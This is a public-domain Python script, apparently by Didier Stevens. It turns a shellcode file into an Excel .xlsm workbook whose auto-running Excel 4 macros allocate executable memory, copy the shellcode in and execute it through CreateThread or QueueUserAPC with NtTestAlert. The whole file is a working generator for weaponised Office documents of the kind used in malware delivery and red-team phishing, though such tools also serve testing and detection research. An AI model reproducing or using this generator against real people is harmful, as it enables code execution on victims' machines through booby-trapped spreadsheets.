#!/usr/bin/env python

__description__ = 'Generate Excel 4 macros for shellcode (without a select loop)'
__author__ = 'Didier Stevens'
__version__ = '0.0.1'
__date__ = '2021/01/19'

"""

Source code put in public domain by Didier Stevens, no Copyright
https://DidierStevens.com
Use at your own risk

History:
  2021/01/18: start
  2021/01/19: added option verbose

Todo:

"""

import optparse
import sys
import textwrap
import zipfile
import binascii
from io import BytesIO
import xml.sax.saxutils

def PrintManual():
    manual = '''
Manual:

This tool takes a file with shellcode as input, and creates an xlsm file with Excel 4 macros (that will auto-execute) to write the shellcode into Excel's memory and then execute.
The shellcode may contain NULL bytes.
The first argument (32 or 64) specifies 32-bit or 64-bit shellcode respectively.

Option -t can be used to provide your own template .xlsm file. It must contain a macro sheet with a first row (that will be replaced).

'''
    for line in manual.split('\n'):
        print(textwrap.fill(line, 78))

# CIC: Call If Callable
def CIC(expression):
    if callable(expression):
        return expression()
    else:
        return expression

# IFF: IF Function
def IFF(expression, valueTrue, valueFalse):
    if expression:
        return CIC(valueTrue)
    else:
        return CIC(valueFalse)

#D:\MyDirsD\Develop\Python\excel4macros\open-write-close-execute.xlsm 7590c44ae6b3c6136be4c7a23206ca07
zipTemplateFile = ''

def IsMacroSheet(sheetname):
    return sheetname.split('/')[:-1] == ['xl', 'macrosheets']

def CreateRowElement(rowNumber, formula):
    return b'<row r="%d" x14ac:dyDescent="0.25"><c r="A%d"><f>%s</f><v>0</v></c></row>' % (rowNumber, rowNumber, formula)

def XMLEscape(data):
    if isinstance(data, str):
        return xml.sax.saxutils.escape(data)
    else:
        return xml.sax.saxutils.escape(data.decode()).encode()

def SequencePayload(payload):
    sequence = []
    stringable = b''
    notstringable = []
    nullbytes = []
    for byte in payload + b'\x00':
        if byte == 0x00:
            if notstringable != []:
                sequence.append(notstringable)
                notstringable = []
            if stringable != b'':
                sequence.append(stringable)
                stringable = b''
            nullbytes.append(byte)
        elif byte >= 0x20 and byte < 0x22 or byte > 0x22 and byte < 0x7F:
            if nullbytes != []:
                sequence.append(len(nullbytes))
                nullbytes = []
            if notstringable != []:
                sequence.append(notstringable)
                notstringable = []
            stringable += bytes([byte])
        else:
            if nullbytes != []:
                sequence.append(len(nullbytes))
                nullbytes = []
            if stringable != b'':
                sequence.append(stringable)
                stringable = b''
            notstringable.append(byte)
    if len(nullbytes) > 1:
        sequence.append(len(nullbytes) - 1)
    return sequence

def SplitSequence(sequence, maxBytes, maxInts):
    result = []
    for item in sequence:
        if isinstance(item, bytes):
            result.extend([item[i:i+maxBytes] for i in range(0, len(item), maxBytes)])
        elif isinstance(item, int):
            result.append(item)
        else:
            result.extend([item[i:i+maxInts] for i in range(0, len(item), maxInts)])
    return result

def GenerateRowsMacroCode32(shellcodeSequence):
    excel4macrosFor32BitShellcodeBegin = [
        b'REGISTER("Kernel32","VirtualAlloc","JJJJJ","VirtualAlloc",,1,9)',
        b'REGISTER("Kernel32","WriteProcessMemory","JJJCJJ","WriteProcessMemory",,1,9)',
        b'REGISTER("Kernel32","CreateThread","JJJJJJJ","CreateThread",,1,9)',
        b'SET.VALUE(B1,VirtualAlloc(0,65536,4096,64))',
    ]

    excel4macrosFor32BitShellcodeEnd = [
        b'CreateThread(0,0,B1,0,0,0)',
        b'HALT()',
    ]

    position = 0
    formulas = excel4macrosFor32BitShellcodeBegin
    for item in shellcodeSequence:
        if isinstance(item, bytes):
            formulas.append(b'WriteProcessMemory(-1,B1+%d,"%s",%d,0)' % (position, XMLEscape(item), len(item)))
            position += len(item)
        elif isinstance(item, int):
            position += item
        else:
            formulas.append(b'WriteProcessMemory(-1,B1+%d,%s,%d,0)' % (position, XMLEscape(b'&'.join([b'CHAR(%d)' % integer for integer in item])), len(item)))
            position += len(item)
    formulas.extend(excel4macrosFor32BitShellcodeEnd)

    return formulas

def GenerateRowsMacroCode64(shellcodeSequence):
    excel4macrosFor64BitShellcodeBegin = [
        b'SET.VALUE(B1,0)',
        b'SET.VALUE(B2,HEX2DEC("50000000"))',
        b'REGISTER("Kernel32","VirtualAlloc","JJJJJ","VirtualAlloc",,1,9)',
        b'WHILE(B1=0)',
        b'SET.VALUE(B1,VirtualAlloc(B2,65536,12288,64))',
        b'SET.VALUE(B2,B2+HEX2DEC("40000"))',
        b'NEXT()',
        b'REGISTER("Kernel32","RtlCopyMemory","JJCJ","RTL",,1,9)',
        b'REGISTER("Kernel32","QueueUserAPC","JJJJ","Queue",,1,9)',
        b'REGISTER("ntdll","NtTestAlert","J","Go",,1,9)',
    ]

    excel4macrosFor64BitShellcodeEnd = [
        b'Queue(B1,-2,0)',
        b'Go()',
        b'HALT()',
    ]

    position = 0
    formulas = excel4macrosFor64BitShellcodeBegin
    for item in shellcodeSequence:
        if isinstance(item, bytes):
            formulas.append(b'RTL(B1+%d,"%s",%d)' % (position, XMLEscape(item), len(item)))
            position += len(item)
        elif isinstance(item, int):
            position += item
        else:
            formulas.append(b'RTL(B1+%d,%s,%d)' % (position, XMLEscape(b'&'.join([b'CHAR(%d)' % integer for integer in item])), len(item)))
            position += len(item)
    formulas.extend(excel4macrosFor64BitShellcodeEnd)

    return formulas

def GenerateRowsMacroCode(bitness, shellcode, verbose):
    sequence = SplitSequence(SequencePayload(shellcode), 250, 100)

    if bitness == '32':
        formulas = GenerateRowsMacroCode32(sequence)
    else:
        formulas = GenerateRowsMacroCode64(sequence)

    if verbose:
        print('Formulas:')
        for formula in formulas:
            print(formula)

    return b''.join([CreateRowElement(index + 1, formula) for index, formula in enumerate(formulas)])

def Excel4MacrosSub(bitness, oZipfileIn, filenamePayload, filenameXLSMOut, options):
    payload = open(filenamePayload, 'rb').read()

    with zipfile.ZipFile(filenameXLSMOut, 'w') as oZipfileOut:
        oZipfileOut.comment = oZipfileIn.comment # preserve the comment
        for item in oZipfileIn.infolist():
            dataOriginal = oZipfileIn.read(item.filename)
            dataChanged = dataOriginal
            if IsMacroSheet(item.filename):
                positionRowBegin = dataOriginal.find(b'<row r="1"')
                if positionRowBegin != -1:
                    positionRowEnd = dataOriginal.find(b'</row>', positionRowBegin)
                    if positionRowEnd != -1:
                        print(item.filename)
                        rowOriginal = dataOriginal[positionRowBegin:positionRowEnd + 6]
                        print(rowOriginal)
                        dataChanged = dataOriginal.replace(rowOriginal, GenerateRowsMacroCode(bitness, payload, options.verbose))
            oZipfileOut.writestr(item, dataChanged)

def Excel4Macros(bitness, filenamePayload, filenameXLSMOut, options):
    if options.template == '':
        with zipfile.ZipFile(BytesIO(binascii.a2b_base64(zipTemplateFile)), 'r') as oZipfileIn:
            Excel4MacrosSub(bitness, oZipfileIn, filenamePayload, filenameXLSMOut, options)
    else:
        with zipfile.ZipFile(options.template, 'r') as oZipfileIn:
            Excel4MacrosSub(bitness, oZipfileIn, filenamePayload, filenameXLSMOut, options)

def Main():
    oParser = optparse.OptionParser(usage='usage: %prog [options] 32|64 filename-shellcode filename-xlsm\n' + __description__, version='%prog ' + __version__)
    oParser.add_option('-m', '--man', action='store_true', default=False, help='Print manual')
    oParser.add_option('-t', '--template', default='', help='.xlsm template to use')
    oParser.add_option('-v', '--verbose', action='store_true', default=False, help='Verbose')
    (options, args) = oParser.parse_args()

    if options.man:
        oParser.print_help()
        PrintManual()
        return

    if len(args) != 3:
        oParser.print_help()
        print('')
        print('  Source code put in the public domain by Didier Stevens, no Copyright')
        print('  Use at your own risk')
        print('  https://DidierStevens.com')
        return
    elif not args[0] in ['32', '64']:
        print('First argument must be 32 or 64')
    else:
        Excel4Macros(args[0], args[1], args[2], options)

if __name__ == '__main__':
    Main()
